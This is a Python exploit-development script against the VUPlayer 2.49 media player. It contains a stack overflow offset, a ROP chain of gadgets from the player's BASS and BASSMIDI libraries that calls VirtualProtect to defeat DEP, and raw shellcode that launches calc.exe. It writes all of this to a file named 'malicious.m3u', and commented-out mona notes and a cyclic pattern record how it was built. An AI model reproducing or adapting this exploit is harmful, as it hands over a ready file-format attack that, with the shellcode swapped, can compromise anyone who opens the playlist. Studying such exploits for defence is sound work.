import sys, struct, os

# buffer = "A"*5000
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

# buffer =  "A"*1012
# buffer += "BBBB"
# buffer += "C"*(5000-len(buffer))


'''
# !mona modules -o
# Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
# ----------------------------------------------------------------------------------------------------------------------------------------------
# 0x00400000 | 0x00592000 | 0x00192000 | False  | False   | False | False |  False   | False  | 2.49 [VUPlayer.exe] (C:\Program Files\VUPlayer\VUPlayer.exe) 0x0
# 0x6c7a0000 | 0x6c7cb000 | 0x0002b000 | True   | True    | True  | False |  True    | False  | 8.00.7601.17514 [ieproxy.dll] (C:\Program Files\Internet Explorer\ieproxy.dll) 0x140
# 0x70cb0000 | 0x70d08000 | 0x00058000 | True   | True    | True  | False |  True    | False  | 6.1.7600.16385 [tiptsf.dll] (C:\Program Files\Common Files\microsoft shared\ink\tiptsf.dll) 0x140
# 0x10600000 | 0x1060f000 | 0x0000f000 | False  | False   | False | False |  False   | False  | 2.3 [BASSMIDI.dll] (C:\Program Files\VUPlayer\BASSMIDI.dll) 0x0
# 0x10100000 | 0x1010a000 | 0x0000a000 | False  | False   | False | False |  False   | False  | 2.3 [BASSWMA.dll] (C:\Program Files\VUPlayer\BASSWMA.dll) 0x0
# 0x10000000 | 0x10041000 | 0x00041000 | False  | False   | False | False |  False   | False  | 2.3 [BASS.dll] (C:\Program Files\VUPlayer\BASS.dll) 0x0

#  EAX = NOP (0x90909090)
#  ECX = lpOldProtect (ptr to W address)
#  EDX = NewProtect (0x40)
#  EBX = dwSize
#  ESP = lPAddress (automatic)
#  EBP = ReturnTo (ptr to jmp esp)
#  ESI = ptr to VirtualProtect()
#  EDI = ROP NOP (RETN)

#[---INFO:gadgets_to_set_esi:---]
0x10015f82,  # POP EAX # RETN [BASS.dll]
0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll]
0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll]
#[---INFO:gadgets_to_set_ebp:---]
x - 0x100086c6,  # POP EBP # RETN [BASS.dll]
x - 0x1000d0ff,  # & jmp esp [BASS.dll]
-> 0x10017c0d : POP EBP # RETN 0x04    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
-> 0x1002a659 : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASS.dll), 0x0
#[---INFO:gadgets_to_set_ebx:---]
x - 0x10016877,  # POP EBX # RETN [BASS.dll]
x - 0x00000201,  # 0x00000201-> ebx
-> 0x10015f77 # POP EAX # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
-> x + 5E20408B = 201 -> x = 201 - 5E20408B = A1DFC176
-> 0x1001bfa2 # ADD EAX,5E20408B # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
-> 0x10032f32 (RVA : 0x00032f32) : # XCHG EAX,EBX # RETN 0x00    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
#[---INFO:gadgets_to_set_edx:---]
x - 0x1004041c,  # POP EDX # RETN [BASS.dll]
x - 0x00000040,  # 0x00000040-> edx
-> 0x10015f77 # POP EAX # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
-> x + 5E20408B = 40 -> x = 40 - 5E20408B = A1DFBFB5
-> 0x1001bfa2 # ADD EAX,5E20408B # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
-> 0x10038a6c # XCHG EAX,EDX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
#[---INFO:gadgets_to_set_ecx:---]
x - 0x10002f78,  # POP ECX # RETN [BASS.dll]
-> 0x10601012 (RVA : 0x00001012) : # POP ECX # RETN    ** [BASSMIDI.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
0x1060d421,  # &Writable location [BASSMIDI.dll]
#[---INFO:gadgets_to_set_edi:---]
x - 0x1000a56a,  # POP EDI # RETN [BASS.dll]
-> 0x100190b0 (RVA : 0x000190b0) : # POP EDI # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
x - 0x1000396b,  # RETN (ROP NOP) [BASS.dll]
-> 0x10101279 : ret
#[---INFO:gadgets_to_set_eax:---]
0x10015f77,  # POP EAX # RETN [BASS.dll]
0x90909090,  # nop
#[---INFO:pushad:---]
0x1001d7a5,  # PUSHAD # RETN [BASS.dll]

'''

#10001008   C3               RETN
retn = "\x79\x12\x10\x10"

buffer =  "A"*1012
buffer += retn

# ESI: VirtualProtect
buffer += struct.pack("<L", 0x10015f82) # POP EAX; RET
buffer += struct.pack("<L", 0x1060e25c) # bassmidi!VirtualProtect
buffer += struct.pack("<L", 0x1001eaf1) # MOV EAX, [EAX]
buffer += struct.pack("<L", 0x10030950) # XCHG EAX, ESI

# EBP: JMP ESP
buffer += struct.pack("<L", 0x10017c0d) # POP EBP; RETN 0x4
buffer += struct.pack("<L", 0x1002a659) # JMP ESP

# EBX: dwSize
buffer += struct.pack("<L", 0x10015f77) # POP EAX; RET
buffer += struct.pack("<L", 0x90909090) # Junk because of 0x10017c0d
buffer += struct.pack("<L", 0xA1DFC176) # A1DFC176 = 201 - 5E20408B
buffer += struct.pack("<L", 0x1001bfa2) # ADD EAX,5E20408B
buffer += struct.pack("<L", 0x10032f32) # XCHG EAX,EBX

# EDX: NewProtect
buffer += struct.pack("<L", 0x10015f77) # POP EAX; RET
buffer += struct.pack("<L", 0xA1DFBFB5)   # A1DFBFB5 = 40 - 5E20408B
buffer += struct.pack("<L", 0x1001bfa2) # ADD EAX,5E20408B
buffer += struct.pack("<L", 0x10038a6c) # XCHG EAX,EDX

# ECX: lpOldProtect
buffer += struct.pack("<L", 0x10601012) # POP ECX; RET
buffer += struct.pack("<L", 0x1060d421) # Writable address

# EDI: Ptr to RET
buffer += struct.pack("<L", 0x100190b0) # POP EDI; RET
buffer += struct.pack("<L", 0x10101279) # ret

# EAX: NOPs
buffer += struct.pack("<L", 0x10015f77) # POP EAX
buffer += struct.pack("<L", 0x90909090) # NOPs

# PUSHAD
buffer += struct.pack("<L", 0x1001d7a5) # PUSHAD; RET

# 195 bit x86 calc payload: https://www.exploit-db.com/exploits/48116
payload = "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0"
buffer += "\x90"*12
buffer += payload

buffer += "C"*(5000-len(buffer))

f = open("malicious.m3u","w")
f.write(buffer)
f.close()